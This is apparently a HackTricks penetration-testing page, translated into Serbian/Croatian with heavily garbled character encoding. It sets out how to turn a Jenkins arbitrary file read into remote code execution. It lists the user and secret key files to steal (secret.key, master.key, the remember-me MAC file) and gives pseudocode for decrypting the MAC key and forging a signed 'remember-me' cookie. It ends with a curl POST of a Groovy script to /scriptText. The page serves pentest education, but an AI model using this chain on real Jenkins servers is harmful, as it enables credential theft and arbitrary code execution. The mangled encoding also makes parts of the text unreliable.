# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

U ovom blog postu je mogu캖e prona캖i odli캜an na캜in da se transformi코e ranjivost Local File Inclusion u Jenkins-u u RCE: [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

Ovo je AI kreirani sa쬰tak dela posta gde se zloupotrebljava kreacija proizvoljnog kola캜i캖a za dobijanje RCE zloupotrebom lokalnog 캜itanja datoteka dok ne budem imao vremena da napravim svoj sa쬰tak:

### Attack Prerequisites

* **Feature Requirement:** "Remember me" mora biti omogu캖eno (podrazumevani postavka).
* **Access Levels:** Napada캜 treba Overall/Read dozvole.
* **Secret Access:** Sposobnost 캜itanja binarnog i tekstualnog sadr쬬ja iz klju캜nih datoteka.

### Detailed Exploitation Process

#### Step 1: Data Collection

**User Information Retrieval**

* Pristupite korisni캜koj konfiguraciji i tajnama iz `$JENKINS_HOME/users/*.xml` za svakog korisnika da prikupite:
* **Korisni캜ko ime**
* **Korisni캜ko seme**
* **Vreme**
* **Hash lozinke**

**Secret Key Extraction**

* Izvucite kriptografske klju캜eve kori코캖ene za potpisivanje kola캜i캖a:
* **Tajni klju캜:** `$JENKINS_HOME/secret.key`
* **Glavni klju캜:** `$JENKINS_HOME/secrets/master.key`
* **MAC klju캜 datoteka:** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### Step 2: Cookie Forging

**Token Preparation**

*   **Izra캜unajte vreme isteka tokena:**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // Dodaje jedan sat trenutnom vremenu
```
{% endcode %}
*   **Kombinujte podatke za token:**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**MAC Key Decryption**

*   **De코ifrujte MAC klju캜 datoteka:**

```javascript
key = toAes128Key(masterKey)  // Pretvorite glavni klju캜 u AES128 format
decrypted = AES.decrypt(macFile, key)  // De코ifrujte .mac datoteku
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**Signature Computation**

*   **Izra캜unajte HMAC SHA256:**

```javascript
mac = HmacSHA256(token, macKey)  // Izra캜unajte HMAC koriste캖i token i MAC klju캜
tokenSignature = bytesToHexString(mac)  // Pretvorite MAC u heksadecimalni string
```

**Cookie Encoding**

*   **Generi코ite kona캜ni kola캜i캖:**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // Base64 kodirajte podatke kola캜i캖a
```
{% endcode %}

#### Step 3: Code Execution

**Session Authentication**

* **Preuzmite CSRF i sesijske tokene:**
* Napravite zahtev ka `/crumbIssuer/api/json` da dobijete `Jenkins-Crumb`.
* Zabele쬴te `JSESSIONID` iz odgovora, koji 캖e se koristiti zajedno sa kola캜i캖em za zapamti me.

**Command Execution Request**

*   **Po코aljite POST zahtev sa Groovy skriptom:**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* Groovy skripta mo쬰 se koristiti za izvr코avanje komandi na sistemskom nivou ili drugih operacija unutar Jenkins okru쬰nja.

Primer curl komande prikazan je kako bi se demonstriralo kako napraviti zahtev ka Jenkins-u sa potrebnim zaglavljima i kola캜i캖ima za sigurno izvr코avanje proizvoljnog koda.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
